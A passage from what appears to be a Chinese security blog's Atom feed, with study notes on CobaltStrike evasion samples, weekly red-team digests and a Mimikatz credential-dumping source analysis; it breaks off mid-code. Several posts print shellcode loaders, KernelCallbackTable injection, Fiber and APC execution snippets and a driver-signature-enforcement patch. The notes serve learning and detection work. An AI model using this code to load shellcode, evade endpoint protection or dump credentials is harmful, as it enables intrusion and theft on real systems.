class="selector-class">.restype</span>=ctypes.c_uint64</div><div class="line">rwxpage = ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.VirtualAlloc</span>(<span class="number">0</span>, len(shellcode), <span class="number">0</span>x1000, <span class="number">0</span>x40)</div><div class="line">ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.RtlMoveMemory</span>(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))</div><div class="line">handle = ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.CreateThread</span>(<span class="number">0</span>, <span class="number">0</span>, ctypes.c_uint64(rwxpage), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.WaitForSingleObject</span>(handle, -<span class="number">1</span>)</div></pre></td></tr></table></figure></li><li><p>而shellcode是很明显的coabaltstrike的shellcode。<br> <img src="http://hacky.wang/blog/20220530/xKfvVYsjc1eo.png?imageslim" alt="mark"></p></li><li><p>Ref:<a href="https://xz.aliyun.com/t/10450#toc-8" target="_blank" rel="external">https://xz.aliyun.com/t/10450#toc-8</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;近期，在狩猎中，捕获到一批高度免杀的CobaltStrike样本，经过分析，目前这些免杀样本具备以下几种特征，第一，不在拘泥于传统的C++作为编程语言，也会采用C#或者Golang，或者脚本语言也会在整个攻击链中使用不同的语言，使用C++可能对使用者的要求有所提高，但是免杀效果可能更好。第二，对于shellcode的加密方式，不在拘泥于传统的异或或者AES，Base等公开的加密编码算法，也会采用一些好玩的，个性化的编码算法进行shellcode加密。第三，在开辟内存空间的时候，也不在使用传统的VirtualAlloc等R3层的API函数，更多的使用基于底层的API函数，第四，在调用shellcode过程中，也不像往常一样使用常规的方式调用shellcode，而是利用一些API的机制(CreateThread)，或者回调机制(EnumSystemLocalesW)，以及APC。&lt;br&gt;
    
    </summary>
    
      <category term="windows 攻防" scheme="https://findream.github.io/categories/windows-%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.4.30-5.6）学习</title>
    <link href="https://findream.github.io/2022/05/10/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.30-5.6)/"/>
    <id>https://findream.github.io/2022/05/10/绿盟科技-每周蓝军技术推送（2022.4.30-5.6)/</id>
    <published>2022-05-10T06:02:11.000Z</published>
    <updated>2022-05-23T11:44:46.297Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-这一周的推送主要介绍的都是一些工具"><a href="#0x00-这一周的推送主要介绍的都是一些工具" class="headerlink" title="0x00 这一周的推送主要介绍的都是一些工具"></a>0x00 这一周的推送主要介绍的都是一些工具</h2><p><a href="https://mp.weixin.qq.com/s/X3FnWqdL-HfzFqfwNntQ6Q" target="_blank" rel="external">每周蓝军技术推送（2022.4.30-5.6)</a></p><a id="more"></a><h2 id="0x01-nim语言轻量化C2"><a href="#0x01-nim语言轻量化C2" class="headerlink" title="0x01 nim语言轻量化C2"></a>0x01 nim语言轻量化C2</h2><ul><li>nimc2 是使用nim编写的C2框架，目前来说作者更新的很快</li><li>生成的implant免杀效果还是很好的</li><li>Ref:<a href="https://github.com/d4rckh/nimc2/blob/main/README.md" target="_blank" rel="external">https://github.com/d4rckh/nimc2/blob/main/README.md</a></li></ul><h2 id="0x02-可注入PE转换工具v1-0版本发布"><a href="#0x02-可注入PE转换工具v1-0版本发布" class="headerlink" title="0x02 可注入PE转换工具v1.0版本发布"></a>0x02 可注入PE转换工具v1.0版本发布</h2><ul><li><p>pe_to_shellcode这款工具原理就是重新复写PE文件DOS头，因为装载器装载PE文件会读取MZ头，这块不能变，剩下的可以进行修改，从第五行开始，定位当前EIP，第六行，ebx为EIP，<code>sub ebx,9</code>则表示ebx为ImageBase，然后加一个常量，最终跳转到入口点。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="string">"\x4D"</span> //<span class="keyword">dec</span> <span class="built_in">ebp</span></div><div class="line"><span class="string">"\x5A"</span> //<span class="keyword">pop</span> <span class="built_in">edx</span></div><div class="line"><span class="string">"\x45"</span> //<span class="keyword">inc</span> <span class="built_in">ebp</span></div><div class="line"><span class="string">"\x52"</span> //<span class="keyword">push</span> <span class="built_in">edx</span></div><div class="line"><span class="string">"\xE8\x00\x00\x00\x00"</span> //<span class="keyword">call</span> &lt;next_line&gt;</div><div class="line"><span class="string">"\x5B"</span> // <span class="keyword">pop</span> <span class="built_in">ebx</span></div><div class="line"><span class="string">"\x48\x83\xEB\x09"</span> // <span class="keyword">sub</span> <span class="built_in">ebx</span>,<span class="number">9</span></div><div class="line"><span class="string">"\x53"</span> // <span class="keyword">push</span> <span class="built_in">ebx</span> (Image Base)</div><div class="line"><span class="string">"\x48\x81\xC3"</span> // <span class="keyword">add</span> <span class="built_in">ebx</span>,</div><div class="line"><span class="string">"\x59\x04\x00\x00"</span> // value</div><div class="line"><span class="string">"\xFF\xD3"</span> // <span class="keyword">call</span> <span class="built_in">ebx</span></div><div class="line"><span class="string">"\xc3"</span><span class="comment">; // ret</span></div></pre></td></tr></table></figure></li><li><p>Ref:<a href="https://github.com/hasherezade/pe_to_shellcode" target="_blank" rel="external">https://github.com/hasherezade/pe_to_shellcode</a></p></li></ul><h2 id="0x03-禁用驱动程序签名强制执行技术"><a href="#0x03-禁用驱动程序签名强制执行技术" class="headerlink" title="0x03 禁用驱动程序签名强制执行技术"></a>0x03 禁用驱动程序签名强制执行技术</h2><ul><li><p>作者首先介绍了，在windows10以前的操作系统，禁用驱动程序强制签名是很容易的，只需要将<code>g_CiOptions</code>设置为0即可。</p></li><li><p>但是在windows10的计算机中，微软启用了基于虚拟化的安全性VBS(Virtualization Based Security)和虚拟机托管程序代码完整性HVCI(Hypervisor Code Integrity)，就不可以很简单的修改内核数据了。</p></li><li><p>所以作者开始寻找在启动VBS的情况下，禁用DSE的方法。</p></li><li><p>根本原理就是通过Patch禁用DSE，首先作者针对<code>CiCheckPolicyBits</code>下断，并查看栈回溯，发现<code>CiValidateImageHeader</code>这是负责验证我们的驱动程序是否满足签名要求的函数,然后作者尝试加载一个未签名的驱动程序，并查看 <code>CiValidateImageHeader</code>的返回值，发现该函数返回值是一个NTSTATUS值(c0000428)，所以作者猜测只需要该函数返回为STATUS_SUCCESS（0）即可。所以只需要寻找一个方法Patch该函数即可。</p></li><li><p>首先作者将虚拟地址转化为PTE(页目录表项)</p></li><li><p>作者通过使用暴力搜索特征码的方式最终定位到了<code>CiValidateImageHeader</code>函数地址，然后Patch如下代码即可。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">xor</span> <span class="built_in">rax</span>, <span class="built_in">rax</span><span class="comment">; ret</span></div></pre></td></tr></table></figure></li><li><p>这篇文章涉及到好多内核的知识，看的不深入。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-这一周的推送主要介绍的都是一些工具&quot;&gt;&lt;a href=&quot;#0x00-这一周的推送主要介绍的都是一些工具&quot; class=&quot;headerlink&quot; title=&quot;0x00 这一周的推送主要介绍的都是一些工具&quot;&gt;&lt;/a&gt;0x00 这一周的推送主要介绍的都是一些工具&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/X3FnWqdL-HfzFqfwNntQ6Q&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;每周蓝军技术推送（2022.4.30-5.6)&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.4.16-4.22）学习</title>
    <link href="https://findream.github.io/2022/04/23/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.16-4.22%EF%BC%89/"/>
    <id>https://findream.github.io/2022/04/23/绿盟科技-每周蓝军技术推送（2022.4.16-4.22）/</id>
    <published>2022-04-23T06:02:11.000Z</published>
    <updated>2022-05-23T11:44:41.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-企业级EDR绕过技术"><a href="#0x01-企业级EDR绕过技术" class="headerlink" title="0x01 企业级EDR绕过技术"></a>0x01 企业级EDR绕过技术</h2><ul><li>原文名称：A blueprint for evading industry leading endpoint protection in 2022</li><li>作者主要介绍了规避现代EDR的几种常见思路</li></ul><a id="more"></a><h2 id="0x02-构建API调用框架绕过杀软hook"><a href="#0x02-构建API调用框架绕过杀软hook" class="headerlink" title="0x02 构建API调用框架绕过杀软hook"></a>0x02 构建API调用框架绕过杀软hook</h2><ul><li><p>通常API函数调用过程如下：<br>3环API(kernel32.dll) -&gt; ntdll.dll -&gt; sysenter -&gt; KiFastCallentry -&gt; SSDT -&gt; 真正调用的0环API</p></li><li><p>文章作者的思路是既然应用层API调用都要经过SSDT，继而调用R0的函数，EDR产品会使用SSDT hook来监控敏感的调用。<br>所以，我们通过伪造的SSDT，来规避EDR产品检测。</p></li><li>作者首先通过中断门，进入R0，然后在伪造SSDT。这样的话，R3程序通过中断门，通过伪造的SSDT进入指定的内核函数。然后规避EDR。</li><li>但是，这个方法比较理想化，第一：win7及以上系统无法通过中断门进入，所以，理论上这个方法只能在windowsxp下实现，第二：因为涉及到驱动文件，如何保证文件落地不被查杀，第二，如何保证驱动能被安全的加载，第三，合理有效的数字签名如何获取。<br>Ref:<a href="https://tttang.com/archive/1546/" target="_blank" rel="external">https://tttang.com/archive/1546/</a></li></ul><h2 id="0x03-Kernelcallbacktable-注入"><a href="#0x03-Kernelcallbacktable-注入" class="headerlink" title="0x03 Kernelcallbacktable 注入"></a>0x03 Kernelcallbacktable 注入</h2><ul><li><p>KernelCallbackTable(系统回调表)是由KeUserModeCallback函数调用，每当GUI进程加载User32.dll的时候，系统就会通过PEB找到KernelCallbackTable地址，并进行初始化为函数数组，这个函数数组中的函数通常用于响应窗口消息。</p></li><li><p>所以，攻击者可以通过修改远程进程的KernelCallbackTable的函数数组，然后发送一个对应的窗口消息，从而实现劫持执行流。</p></li><li><p>本文作者参考modexpblog的思路：</p><ul><li><p>通过窗口获取目标进程Pid，从而获取目标进程的伪句柄。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">HANDLE hProcess = OpenProcess(<span class="name">PROCESS_ALL_ACCESS</span>, FALSE, pid)<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] Process Handle: 0x%p\n"</span>, hProcess)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>通过调用<code>NtQueryInformationProcess</code>获取ProcessBasicInformation，pbi结构体中保存着Peb的地址</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PROCESS_BASIC_INFORMATION pbi<span class="comment">;</span></div><div class="line">pNtQueryInformationProcess myNtQueryInformationProcess = (<span class="name">pNtQueryInformationProcess</span>)GetProcAddress(<span class="name">GetModuleHandle</span>(<span class="name">L</span><span class="string">"ntdll.dll"</span>), <span class="string">"NtQueryInformationProcess"</span>)<span class="comment">;</span></div><div class="line">myNtQueryInformationProcess(<span class="name">hProcess</span>, ProcessBasicInformation, <span class="symbol">&amp;pbi</span>, sizeof(<span class="name">pbi</span>), NULL)<span class="comment">;</span></div></pre></td></tr></table></figure></li></ul></li></ul><pre><code>* 通过PEB获取KernelCallbackTable</code></pre><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">PEB peb;</div><div class="line">ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, <span class="keyword">sizeof</span>(peb), <span class="literal">NULL</span>);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] PEB Address: 0x%p\n"</span>, pbi.PebBaseAddress);</div><div class="line">KERNELCALLBACKTABLE kct;</div><div class="line">ReadProcessMemory(hProcess, peb.KernelCallbackTable, &amp;kct, <span class="keyword">sizeof</span>(kct), <span class="literal">NULL</span>);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] KernelCallbackTable Address: 0x%p\n"</span>, peb.KernelCallbackTable);</div><div class="line">``` </div><div class="line">    * 将shellcode和新的KernelCallbackTable写入远程进程</div></pre></td></tr></table></figure><p>LPVOID newKCTAddr = VirtualAllocEx(hProcess, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br>kct.__fnCOPYDATA = (ULONG_PTR)payloadAddr;<br>WriteProcessMemory(hProcess, newKCTAddr, &amp;kct, sizeof(kct), NULL);<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">* </span>更新一下PEB的KernelCallbackTable地址。</div></pre></td></tr></table></figure></p><p>// Update the PEB<br>WriteProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &amp;newKCTAddr, sizeof(ULONG_PTR), NULL);<br>printf(“[+] Remote process PEB updated\n”);<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">* </span>最后，通过发送窗口请求，响应操作</div></pre></td></tr></table></figure></p><p>COPYDATASTRUCT cds;<br>WCHAR msg[] = L”Pwn”;<br>cds.dwData = 1;<br>cds.cbData = lstrlen(msg) * 2;<br>cds.lpData = msg;<br>SendMessage(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)&amp;cds);<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>Ref:[<span class="string">Adventures with KernelCallbackTable Injection</span>](<span class="link">https://captmeelo.com/redteam/maldev/2022/04/21/kernelcallbacktable-injection.html</span>)</div><div class="line"></div><div class="line"><span class="bullet">* </span>Ref:[<span class="string">Windows Process Injection: KernelCallbackTable used by FinFisher / FinSpy</span>](<span class="link">https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/</span>)</div><div class="line"></div><div class="line"><span class="bullet">* </span>Ref:[<span class="string">攻击技术研判 ｜Lazarus搭载新的载荷执行与控制流劫持技术(此处原文应该来自M01n)</span>](<span class="link">http://www.ctfiot.com/28074.html</span>)</div><div class="line"></div><div class="line"><span class="section">## 0x04 利用Exception Directory获取系统服务调用号</span></div><div class="line"><span class="bullet">* </span>这篇文章思维跳跃度太高，没太看明白。</div><div class="line"></div><div class="line"><span class="section">## 0x05 常见的PE打包器在Windows 11中的免杀测试</span></div><div class="line"><span class="bullet">* </span>这几款免杀框架主要都采用了一下技术：</div><div class="line"><span class="bullet">* </span>Loader[ScareCrow]：通过将恶意的dll注入到诸如Wscript,Msiexe等系统进程中，规避一些EDR的检测，但效果估计差强人意。</div><div class="line"><span class="bullet">* </span>Console[ScareCrow]:通常，恶意软件需要隐藏窗口是通过创建进程时，设置ldflags标志实现的，但是这很容易被EDR检测到，所以，通过GetConsoleWindow和ShowWindow实现窗口隐藏。</div><div class="line"><span class="bullet">* </span>ByPass AMSI和ETW[ScareCrow,inceptor等]:这没什么好说的，正常的都会这样做的。</div><div class="line"><span class="bullet">* </span>Delivery[ScareCrow]:这个没太看懂，应该是一种远程命令执行，或者远程数据传递的技术吧。</div><div class="line"><span class="bullet">* </span>AntiDebug[PEzor]:反调试</div><div class="line"><span class="bullet">* </span>unhook[PEzor]:移除部分用户层Hook</div><div class="line"><span class="bullet">* </span>syscalls[PEzor，Nimcrypt2等]:syscall 规避用户层Hook</div><div class="line"><span class="bullet">* </span>Shellcode和函数名加密[charlotte,FourEye,inceptor等等]</div><div class="line"><span class="bullet">* </span>API动态调用[charlotte]:charlotte所指的动态调用是指使用GetProcAddress获取函数地址后，然后调用。</div><div class="line"><span class="bullet">* </span>正常文件插入shellcode[Sh3llter,msf,cobaltstrike旧版本]：可以有效降低信息熵，但是cs在近几个版本中取消了。</div><div class="line"><span class="bullet">* </span>Fiber(纤程)和APC[FourEye，Nimcrypt2]：FourEye的这几种方法都是在处理调用shellcode如何实现免杀，常见的直接调用shellcode不容易绕过EDR。</div><div class="line"><span class="code">    * Fiber这个方案主要调用CreateFiber创建一个纤程对象，然后调用SwitchToFiber选择即可。</span></div><div class="line"><span class="code">    * APC这个方案就是调用QueueUserAPC插入一个APC到队列中</span></div><div class="line"><span class="bullet">* </span>Ntdll ByPass</div><div class="line"><span class="bullet">* </span>通过一些不常见的语言Nim来减少特征[Nimcrypt2]</div><div class="line"><span class="bullet">* </span>系统调用名称随机化[Nimcrypt2]:就是在获取API函数地址的时候，使用随机的函数名称，这样减缓分析进度。</div><div class="line"><span class="bullet">* </span>LLVM混淆[Nimcrypt2]</div></pre></td></tr></table></figure></p><p>//Fiber<br>PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>memcpy(shellcodeLocation, shellcode, sizeof shellcode);<br>PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);<br>SwitchToFiber(shellcodeFiber);<br>//APC<br>char<em> buffer = (char</em>)Allocate(GetCurrentProcess(), 0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>CopyMemory(buffer, shellcode, shellcode_size);<br>QueueUserAPC((PAPCFUNC)buffer, hthread, (ULONG_PTR)buffer);<br>```</p><ul><li>===&gt;[TODO]如果要学怎么写一个免杀框架，<a href="https://github.com/klezVirus/inceptor" target="_blank" rel="external">inceptor</a>是一个很好地学习例子。</li><li>Ref:<a href="https://github.com/klezVirus/inceptor" target="_blank" rel="external">https://github.com/klezVirus/inceptor</a></li><li>Ref:<a href="https://assume-breach.medium.com/home-grown-red-team-testing-common-av-evasion-with-pe-packers-on-windows-11-a2a9e873fe13" target="_blank" rel="external">https://assume-breach.medium.com/home-grown-red-team-testing-common-av-evasion-with-pe-packers-on-windows-11-a2a9e873fe13</a></li><li>Ref:<a href="https://www.1ight.top/纤程注入shellcode/" target="_blank" rel="external">https://www.1ight.top/纤程注入shellcode/</a></li></ul><h2 id="0x06-攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK"><a href="#0x06-攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK" class="headerlink" title="0x06 攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK"></a>0x06 攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK</h2><ul><li>就是利用社会工程学伪装lnk执行后续恶意dll。</li><li><a href="https://mp.weixin.qq.com/s/rCEoKdi-_qLWw86vZKrVWA" target="_blank" rel="external">https://mp.weixin.qq.com/s/rCEoKdi-_qLWw86vZKrVWA</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-企业级EDR绕过技术&quot;&gt;&lt;a href=&quot;#0x01-企业级EDR绕过技术&quot; class=&quot;headerlink&quot; title=&quot;0x01 企业级EDR绕过技术&quot;&gt;&lt;/a&gt;0x01 企业级EDR绕过技术&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;原文名称：A blueprint for evading industry leading endpoint protection in 2022&lt;/li&gt;
&lt;li&gt;作者主要介绍了规避现代EDR的几种常见思路&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>Mimikatz原理分析和检测</title>
    <link href="https://findream.github.io/2022/04/22/Mimikatz%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8C%E6%A3%80%E6%B5%8B/"/>
    <id>https://findream.github.io/2022/04/22/Mimikatz原理分析和检测/</id>
    <published>2022-04-22T06:02:11.000Z</published>
    <updated>2022-05-23T11:58:32.551Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li>这是学习Mimikatz工作原理的无总结笔记。主要包含了<code>sekurlsa::msv</code>,<code>sekurlsa::pth</code>,<code>lsadump::dcsync</code>,票据传递等功能的原理分析和检测。<a id="more"></a></li></ul><h2 id="sekurlsa-msv源码分析"><a href="#sekurlsa-msv源码分析" class="headerlink" title="sekurlsa::msv源码分析"></a>sekurlsa::msv源码分析</h2><ul><li>Mimikatz的sekurlsa::msv命令是用于获取NTLM协议加密的凭证</li><li>其在mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c中的NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)函数中实现。</li><li>具体原理是通过特征码定位Lsass.exe进程的lsasvr.dll中的LogonSessionList全局变量和LogonSessionListCount全局变量的地址，然后解析LogonSessionList结构体即可，LogonSessionList是一个双向链表(LIST_ENTRY)。</li><li><p>在NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)函数中，首先调用kuhl_m_sekurlsa_acquireLSA()函数用于获取相关模块信息，主要是在kull_m_process_getVeryBasicModuleInformations()函数中，通过PEB获取指定的lsasvr.dll基地址。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">moduleInformation.NameDontUseOutsideCallback</span> = &amp;moduleName<span class="comment">;</span></div><div class="line"><span class="symbol">if</span>(kull_m_process_peb(memory, &amp;Peb, FALSE))</div><div class="line">&#123;</div><div class="line">aBuffer.<span class="keyword">address </span>= &amp;<span class="keyword">LdrData; </span>aProcess.<span class="keyword">address </span>= Peb.<span class="keyword">Ldr;</span></div><div class="line"><span class="keyword"></span><span class="meta">if</span>(kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, sizeof(<span class="keyword">LdrData)))</span></div><div class="line"><span class="keyword"></span>&#123;</div><div class="line">for(</div><div class="line">aLire  = (PBYTE) (<span class="keyword">LdrData.InMemoryOrderModulevector.Flink) </span>- FIELD_OFFSET(<span class="keyword">LDR_DATA_TABLE_ENTRY, </span>InMemoryOrderLinks),</div><div class="line">fin    = (PBYTE) (Peb.<span class="keyword">Ldr) </span>+ FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector)<span class="comment">;</span></div><div class="line">(aLire != fin) &amp;&amp; continueCallback<span class="comment">;</span></div><div class="line">aLire  = (PBYTE) <span class="keyword">LdrEntry.InMemoryOrderLinks.Flink </span>- FIELD_OFFSET(<span class="keyword">LDR_DATA_TABLE_ENTRY, </span>InMemoryOrderLinks)</div><div class="line">)</div><div class="line">&#123;</div><div class="line">aBuffer.<span class="keyword">address </span>= &amp;<span class="keyword">LdrEntry; </span>aProcess.<span class="keyword">address </span>= aLire<span class="comment">;</span></div><div class="line"><span class="meta">if</span>(continueCallback = kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, sizeof(<span class="keyword">LdrEntry)))</span></div><div class="line"><span class="keyword"></span>&#123;</div><div class="line">moduleInformation.DllBase.<span class="keyword">address </span>= <span class="keyword">LdrEntry.DllBase;</span></div><div class="line"><span class="keyword"></span>moduleInformation.SizeOfImage = <span class="keyword">LdrEntry.SizeOfImage;</span></div><div class="line"><span class="keyword"></span>moduleName = <span class="keyword">LdrEntry.BaseDllName;</span></div><div class="line"><span class="keyword"></span><span class="meta">if</span>(moduleName.<span class="keyword">Buffer </span>= (PWSTR) LocalAlloc(LPTR, moduleName.MaximumLength))</div><div class="line">&#123;</div><div class="line">aBuffer.<span class="keyword">address </span>= moduleName.<span class="keyword">Buffer; </span>aProcess.<span class="keyword">address </span>= <span class="keyword">LdrEntry.BaseDllName.Buffer;</span></div><div class="line"><span class="keyword"></span><span class="meta">if</span>(kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, moduleName.MaximumLength))</div><div class="line">&#123;</div><div class="line">kull_m_process_adjustTimeDateStamp(&amp;moduleInformation)<span class="comment">;</span></div><div class="line">continueCallback = callBack(&amp;moduleInformation, pvArg)<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">LocalFree(moduleName.<span class="keyword">Buffer);</span></div><div class="line"><span class="keyword"></span>&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">status = STATUS_SUCCESS<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后通过kuhl_m_sekurlsa_utils_search()函数搜索LogonSessionList全局变量和LogonSessionListCount全局变量的地址,其中LsaSrvReferences数组存储着不同系统版本的索引特征码(位于kuhl_m_sekurlsa_utils.c文件中)</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)</div><div class="line">&#123;</div><div class="line">PVOID *pLogonSessionListCount = (cLsass-&gt;osContext.BuildNumber &lt; KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID *) &amp;LogonSessionListCount);</div><div class="line">return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,  ARRAYSIZE(LsaSrvReferences), (PVOID *) &amp;LogonSessionList, pLogonSessionListCount, NULL, NULL);</div><div class="line">&#125;</div><div class="line">KULL_M_PATCH_GENERIC LsaSrvReferences[] = &#123;</div><div class="line">&#123;KULL_M_WIN_BUILD_XP,&#123;sizeof(PTRN_WIN5_LogonSessionList),PTRN_WIN5_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>,   <span class="number">0</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_2K3,&#123;sizeof(PTRN_WIN5_LogonSessionList),PTRN_WIN5_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>, -<span class="number">45</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_VISTA,&#123;sizeof(PTRN_WN60_LogonSessionList),PTRN_WN60_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">21</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_7,&#123;sizeof(PTRN_WN61_LogonSessionList),PTRN_WN61_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">19</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_8,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_BLUE,&#123;sizeof(PTRN_WN63_LogonSessionList),PTRN_WN63_LogonSessionList&#125;,&#123;<span 